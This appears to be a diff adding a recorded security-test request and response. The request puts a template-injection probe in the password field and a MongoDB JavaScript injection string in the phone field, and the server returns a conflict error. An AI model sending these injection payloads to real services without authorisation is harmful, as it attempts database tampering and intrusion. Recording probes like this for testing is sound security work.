@@ -1,0 +1,6 @@
+
+Request:
+{"name":"wahyu","password":"${42*42}","phone":"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1"}
+
+Responses:
+{"code":"Conflict","message":"user with this phone already exist","serverTime":1645898916310}
